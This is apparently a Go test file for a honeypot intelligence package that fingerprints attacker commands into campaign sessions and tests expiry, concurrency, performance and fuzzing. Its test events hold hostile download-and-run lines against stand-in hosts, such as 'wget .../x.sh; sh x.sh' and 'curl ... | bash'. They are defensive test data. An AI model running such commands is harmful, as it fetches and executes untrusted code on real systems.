package intelligence

import (
	"fmt"
	"runtime"
	"sync"
	"testing"
	"time"

	"github.com/qpot/qpot/internal/database"
)

func makeTTPEvent(sourceIP, command string) *database.Event {
	return &database.Event{
		Honeypot:       "cowrie",
		SourceIP:       sourceIP,
		EventType:      "command",
		Command:        command,
		TechniqueID:    "T1059",
		KillChainStage: "execution",
		Timestamp:      time.Now().UTC(),
	}
}

// ---- session lifecycle ----

func TestNewSessionCreated(t *testing.T) {
	b := NewTTPBuilder(30 * time.Minute)
	ev := makeTTPEvent("203.0.113.1", "id")
	_, isNew := b.Update(ev)
	if !isNew {
		t.Error("first event should create a new session")
	}
}

func TestSessionMergesForSameCampaign(t *testing.T) {
	b := NewTTPBuilder(30 * time.Minute)
	// Use same command stem so fingerprint matches.
	ev1 := makeTTPEvent("203.0.113.1", "wget http://c2.example.com/stage1")
	ev2 := makeTTPEvent("203.0.113.2", "wget http://c2.example.com/stage2")

	_, isNew1 := b.Update(ev1)
	_, isNew2 := b.Update(ev2)

	if !isNew1 {
		t.Error("first event should be new")
	}
	if isNew2 {
		t.Error("second event with same stem should merge into existing session")
	}
}

// The download host in a campaign fingerprint is the host the URL connects
// to; userinfo in front of it is free text an attacker can vary per bot.
func TestFingerprintUsesHostAfterUserinfo(t *testing.T) {
	a := campaignFingerprint(makeTTPEvent("203.0.113.1", "wget http://a.example@203.0.113.9/x.sh"))
	b := campaignFingerprint(makeTTPEvent("203.0.113.2", "wget http://b.example@203.0.113.9/x.sh"))
	c := campaignFingerprint(makeTTPEvent("203.0.113.3", "wget http://203.0.113.9/x.sh"))
	if a != b || b != c {
		t.Fatalf("same download host, different fingerprints: %s %s %s", a, b, c)
	}
}

func TestSessionEventCountGrows(t *testing.T) {
	b := NewTTPBuilder(30 * time.Minute)
	ev := makeTTPEvent("203.0.113.1", "wget http://c2.example.com/x")
	for i := 0; i < 5; i++ {
		b.Update(ev)
	}
	sessions := b.GetActiveSessions()
	if len(sessions) == 0 {
		t.Fatal("no active sessions")
	}
	if sessions[0].EventCount < 5 {
		t.Errorf("expected EventCount ≥ 5, got %d", sessions[0].EventCount)
	}
}

func TestSessionConfidenceGrowsWithEvents(t *testing.T) {
	b := NewTTPBuilder(30 * time.Minute)
	ev := makeTTPEvent("203.0.113.1", "wget http://c2.example.com/x")

	var prev float64
	for i := 0; i < 10; i++ {
		b.Update(ev)
	}
	sessions := b.GetActiveSessions()
	if len(sessions) == 0 {
		t.Fatal("no active sessions")
	}
	prev = sessions[0].Confidence

	for i := 0; i < 50; i++ {
		b.Update(ev)
	}
	sessions = b.GetActiveSessions()
	if sessions[0].Confidence <= prev {
		t.Errorf("confidence should grow with more events: before=%f after=%f",
			prev, sessions[0].Confidence)
	}
}

func TestSessionConfidenceCappedAt095(t *testing.T) {
	b := NewTTPBuilder(30 * time.Minute)
	ev := makeTTPEvent("203.0.113.1", "wget http://c2.example.com/x")
	for i := 0; i < 1000; i++ {
		b.Update(ev)
	}
	sessions := b.GetActiveSessions()
	for _, s := range sessions {
		if s.Confidence > 0.95 {
			t.Errorf("confidence exceeds 0.95 cap: %f", s.Confidence)
		}
	}
}

// ---- expiry ----

func TestFlushExpiredRemovesStaleSessions(t *testing.T) {
	b := NewTTPBuilder(1 * time.Millisecond) // very short inactivity window
	ev := makeTTPEvent("203.0.113.1", "id")
	// Set an old timestamp so the session is immediately expired.
	ev.Timestamp = time.Now().UTC().Add(-1 * time.Hour)
	b.Update(ev)

	time.Sleep(5 * time.Millisecond)
	expired := b.FlushExpired()
	if len(expired) == 0 {
		t.Error("expected at least one expired session, got none")
	}
	if len(b.GetActiveSessions()) != 0 {
		t.Error("active sessions should be empty after flush")
	}
}

func TestFlushExpiredKeepsActiveSessions(t *testing.T) {
	b := NewTTPBuilder(10 * time.Minute)
	ev := makeTTPEvent("203.0.113.1", "wget http://c2.example.com/x")
	b.Update(ev)
	expired := b.FlushExpired()
	if len(expired) != 0 {
		t.Errorf("fresh session should not be expired, got %d expired", len(expired))
	}
}

// ---- fingerprint ----

func TestCampaignFingerprintStability(t *testing.T) {
	ev1 := makeTTPEvent("203.0.113.1", "wget http://c2.io/payload")
	ev2 := makeTTPEvent("203.0.113.2", "wget http://c2.io/stage2")
	if campaignFingerprint(ev1) != campaignFingerprint(ev2) {
		t.Error("same stem (wget) should produce the same campaign fingerprint")
	}
}

func TestCampaignFingerprintFallsBackToIP(t *testing.T) {
	// No command, no tools → fingerprint is based on source IP.
	ev := &database.Event{
		Honeypot:  "cowrie",
		SourceIP:  "203.0.113.5",
		EventType: "login_failed",
		Timestamp: time.Now().UTC(),
	}
	fp := campaignFingerprint(ev)
	if fp == "" {
		t.Error("fingerprint should not be empty")
	}
	// Same IP → same fingerprint.
	if fp != campaignFingerprint(ev) {
		t.Error("fingerprint should be deterministic")
	}
}

func TestDifferentToolsDifferentFingerprint(t *testing.T) {
	ev1 := makeTTPEvent("203.0.113.1", "wget http://c2a.io/x")
	ev2 := makeTTPEvent("203.0.113.1", "curl http://c2b.io/x")
	// wget vs curl → different stems → different fingerprints.
	if campaignFingerprint(ev1) == campaignFingerprint(ev2) {
		t.Error("different tool stems should produce different fingerprints")
	}
}

// ---- shared infrastructure ----

func TestSharedInfrastructureAWS(t *testing.T) {
	if !isSharedInfrastructure("52.12.34.56") {
		t.Error("AWS IP 52.x.x.x should be flagged as shared infrastructure")
	}
}

func TestSharedInfrastructurePrivateNotFlagged(t *testing.T) {
	// Private IPs are not cloud infrastructure.
	if isSharedInfrastructure("192.168.1.1") {
		t.Error("private IP should not be flagged as shared infrastructure")
	}
}

// ---- concurrency stress ----

func TestTTPBuilderConcurrent(t *testing.T) {
	b := NewTTPBuilder(30 * time.Minute)
	const goroutines = 20
	const events = 100
	var wg sync.WaitGroup
	wg.Add(goroutines)
	for g := 0; g < goroutines; g++ {
		g := g
		go func() {
			defer wg.Done()
			for i := 0; i < events; i++ {
				// Use varied commands to create realistic spread of sessions.
				cmd := fmt.Sprintf("wget http://c2-%d.example.com/payload", g%5)
				ev := makeTTPEvent(fmt.Sprintf("203.0.113.%d", g+1), cmd)
				b.Update(ev)
			}
		}()
	}
	wg.Wait()

	sessions := b.GetActiveSessions()
	if len(sessions) == 0 {
		t.Error("expected active sessions after concurrent updates")
	}
}

// A campaign that returns after its session expired must get a new session
// ID (same campaign fingerprint), so persisting it can't overwrite the
// earlier, already-flushed session.
func TestReturningCampaignGetsNewSessionID(t *testing.T) {
	b := NewTTPBuilder(time.Minute)
	ev := func(at time.Time) *database.Event {
		return &database.Event{Timestamp: at, Honeypot: "cowrie", SourceIP: "203.0.113.20",
			EventType: "command", Command: "wget http://198.51.100.9/bot.sh", Username: "root"}
	}
	first, _ := b.Update(ev(time.Now().UTC().Add(-2 * time.Hour)))
	firstID, firstFP := first.SessionID, first.CampaignFingerprint
	if got := b.FlushExpired(); len(got) != 1 {
		t.Fatalf("FlushExpired returned %d sessions, want 1", len(got))
	}
	second, isNew := b.Update(ev(time.Now().UTC()))
	if !isNew {
		t.Fatal("returning campaign should start a new session")
	}
	if second.CampaignFingerprint != firstFP {
		t.Fatalf("campaign fingerprint changed: %q vs %q", second.CampaignFingerprint, firstFP)
	}
	if second.SessionID == firstID {
		t.Fatalf("new session reused flushed session ID %q", firstID)
	}
}

// A campaign many bots share (one dropper URL, thousands of addresses) is one
// session. Every Update re-sorted and re-copied its whole source-IP set, so
// each event cost O(n log n) and a worker batch grew quadratic with the
// campaign. A repeat sighting must not rebuild the list, and the list is
// bounded.
func TestTTPUpdateCostDoesNotGrowWithCampaign(t *testing.T) {
	b := NewTTPBuilder(time.Hour)
	ev := func(ip string) *database.Event {
		return &database.Event{Honeypot: "cowrie", EventType: "command", SourceIP: ip,
			Command: "cd /tmp; wget http://198.51.100.9/bins.sh", Timestamp: time.Now().UTC()}
	}
	for i := 0; i < 20000; i++ {
		b.Update(ev(fmt.Sprintf("10.%d.%d.%d", i>>16&255, i>>8&255, i&255)))
	}
	small := NewTTPBuilder(time.Hour)
	small.Update(ev("10.0.0.1"))
	repeats := func(bld *TTPBuilder) uint64 {
		var before, after runtime.MemStats
		runtime.GC()
		runtime.ReadMemStats(&before)
		for i := 0; i < 200; i++ {
			bld.Update(ev("10.0.0.1")) // repeat sightings
		}
		runtime.ReadMemStats(&after)
		return after.TotalAlloc - before.TotalAlloc
	}
	// The same sightings must cost about the same on a 1-IP and a 20000-IP
	// session (a ratio, so the race detector's overhead does not matter).
	oneIP, bigSession := repeats(small), repeats(b)
	if bigSession > 2*oneIP+(1<<20) {
		t.Fatalf("200 repeat sightings allocated %d KiB on a 20000-IP session, %d KiB on a 1-IP one",
			bigSession>>10, oneIP>>10)
	}
	s := b.GetActiveSessions()
	if len(s) != 1 || len(s[0].SourceIPs) > maxSessionIPs {
		t.Fatalf("sessions=%d source IPs=%d, want 1 session with at most %d", len(s), len(s[0].SourceIPs), maxSessionIPs)
	}
	for i := 1; i < len(s[0].SourceIPs); i++ {
		if s[0].SourceIPs[i-1] >= s[0].SourceIPs[i] {
			t.Fatal("source IPs not sorted and unique")
		}
	}
	if s[0].EventCount != 20200 {
		t.Fatalf("event count %d, want 20200", s[0].EventCount)
	}
}

// FuzzTTPBuilder drives the campaign builder with attacker-controlled
// commands, user agents, usernames and source addresses. It must never panic,
// must fingerprint an event the same way every time, and must keep each
// session's derived fields consistent.
func FuzzTTPBuilder(f *testing.F) {
	f.Add("wget http://a.example@203.0.113.9/x.sh; sh x.sh", "Wget/1.21", "root", "203.0.113.1", int64(0))
	f.Add("curl HXXPS://bad[.]example/b | bash", "", "admin", "2001:db8::1", int64(-3600))
	f.Add("", "", "", "", int64(1<<40))
	f.Add("\x00\xff http://[::1]:22/ http://0x7f.1/", "\xff", "\x00", "not-an-ip", int64(-1<<40))
	f.Fuzz(func(t *testing.T, cmd, ua, user, ip string, offset int64) {
		ev := &database.Event{
			Honeypot: "cowrie", SourceIP: ip, EventType: "command", Command: cmd, Username: user,
			Metadata:  map[string]string{"user_agent": ua},
			Timestamp: time.Unix(1_800_000_000+offset%(1<<33), 0).UTC(),
		}
		if a, b := campaignFingerprint(ev), campaignFingerprint(ev); a != b || len(a) != 8 {
			t.Fatalf("fingerprint unstable or malformed: %q %q", a, b)
		}
		bld := NewTTPBuilder(time.Hour)
		for i := 0; i < 3; i++ {
			s, _ := bld.Update(ev)
			if s.EventCount != int64(i+1) {
				t.Fatalf("event count %d after %d updates", s.EventCount, i+1)
			}
			if s.Confidence < 0.5 || s.Confidence > 0.95 {
				t.Fatalf("confidence %v out of range", s.Confidence)
			}
			if s.LastSeen.Before(s.FirstSeen) {
				t.Fatalf("last_seen %v before first_seen %v", s.LastSeen, s.FirstSeen)
			}
		}
		for _, s := range bld.GetActiveSessions() {
			for i := 1; i < len(s.SourceIPs); i++ {
				if s.SourceIPs[i-1] >= s.SourceIPs[i] {
					t.Fatalf("source IPs not sorted and unique: %q", s.SourceIPs)
				}
			}
		}
		_ = bld.FlushExpired()
	})
}
